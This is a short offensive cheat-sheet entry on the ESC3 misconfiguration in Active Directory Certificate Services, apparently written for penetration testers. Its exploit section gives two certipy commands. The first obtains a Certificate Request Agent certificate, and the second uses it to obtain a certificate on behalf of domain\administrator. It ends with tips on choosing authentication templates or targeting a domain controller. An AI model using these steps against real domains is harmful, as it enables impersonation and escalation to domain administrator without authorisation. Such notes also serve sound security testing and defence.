# ESC3 -Template misconfigurations
If a certificate template specifies the **Certificate Request Agent** EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.

### Exploit
-------

Request a certificate vulnerable to ESC3:   

```text-plain
certipy req 'domain.local/user:password@adcs.domain.local' -ca 'domain-CA' -template 'ESC3'
```

Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user :

```text-plain
certipy req 'domain.local/user:password@adcs.domain.local' -ca 'domain-CA' -template 'User' -on-behalf-of 'domain\administrator' -pfx 'user.pfx'
```

### PS 
---

*   Find a certificate that allow authentication (ex: User)
*   You can also ask a certificate for a DC
